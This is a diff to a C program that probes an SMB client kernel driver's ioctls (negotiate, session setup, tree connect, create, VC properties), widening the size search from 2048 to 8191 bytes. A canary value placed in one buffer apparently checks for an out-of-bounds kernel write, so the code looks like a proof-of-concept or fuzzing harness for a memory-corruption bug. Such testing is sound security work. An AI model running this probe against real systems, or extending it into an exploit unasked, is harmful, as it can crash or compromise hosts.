@@ -259,7 +259,7 @@ int main(int argc, char **argv) {
     neg->ioc_version = SMB_IOC_STRUCT_VERSION;
     strncpy(neg->ioc_ssn.ioc_srvname, server,
             sizeof(neg->ioc_ssn.ioc_srvname) - 1);
-    long nsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 109, bufA, 256, 2048);
+    long nsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 109, bufA, 256, 8191);
     printf("[*] NEGOTIATE matched size=%ld ret_caps=0x%x\n",
            nsz, neg->ioc_ret_caps);
     if (nsz < 0) { printf("[-] no NEGOTIATE size dispatched\n"); return 1; }
@@ -268,7 +268,7 @@ int main(int argc, char **argv) {
     memset(bufB, 0, sizeof(bufB));
     ss->ioc_version = SMB_IOC_STRUCT_VERSION;
     strcpy(ss->ioc_domain, "WORKGROUP");
-    long ssz = find_ioctl_size(fd, 0x80000000 | (0x6E << 8) | 110, bufB, 256, 2048);
+    long ssz = find_ioctl_size(fd, 0x80000000 | (0x6E << 8) | 110, bufB, 256, 8191);
     printf("[*] SSNSETUP matched size=%ld\n", ssz);
     if (ssz < 0) { printf("[-] no SSNSETUP size dispatched\n"); return 1; }
 
@@ -276,7 +276,7 @@ int main(int argc, char **argv) {
     memset(bufC, 0, sizeof(bufC));
     tcon->ioc_version = SMB_IOC_STRUCT_VERSION;
     strncpy(tcon->ioc_share, share, sizeof(tcon->ioc_share) - 1);
-    long tsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 111, bufC, 256, 2048);
+    long tsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 111, bufC, 256, 8191);
     printf("[*] TCON matched size=%ld\n", tsz);
     if (tsz < 0) { printf("[-] no TCON size dispatched\n"); return 1; }
 
@@ -290,7 +290,7 @@ int main(int argc, char **argv) {
     cr->ioc_file_attributes = 0x80;
     cr->ioc_share_access = 1 | 2 | 4;
     cr->ioc_disposition = 1;
-    long csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 120, bufD, 256, 2048);
+    long csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 120, bufD, 256, 8191);
     printf("[*] CREATE matched size=%ld ntstatus=0x%x\n", csz, cr->ioc_ret_ntstatus);
     if (csz < 0) { printf("[-] no CREATE size dispatched\n"); return 1; }
 
@@ -300,7 +300,7 @@ int main(int argc, char **argv) {
     volatile uint64_t *guard = (volatile uint64_t *)(bufE + 576);
     *guard = 0xDEADBEEFDEADBEEFULL;
 
-    long psz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 116, bufE, 256, 2048);
+    long psz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 116, bufE, 256, 8191);
     printf("[*] VC_PROPERTIES matched size=%ld misc_flags=0x%llx "
            "returned_model_len=%lu\n",
            psz, (unsigned long long)vp->misc_flags,
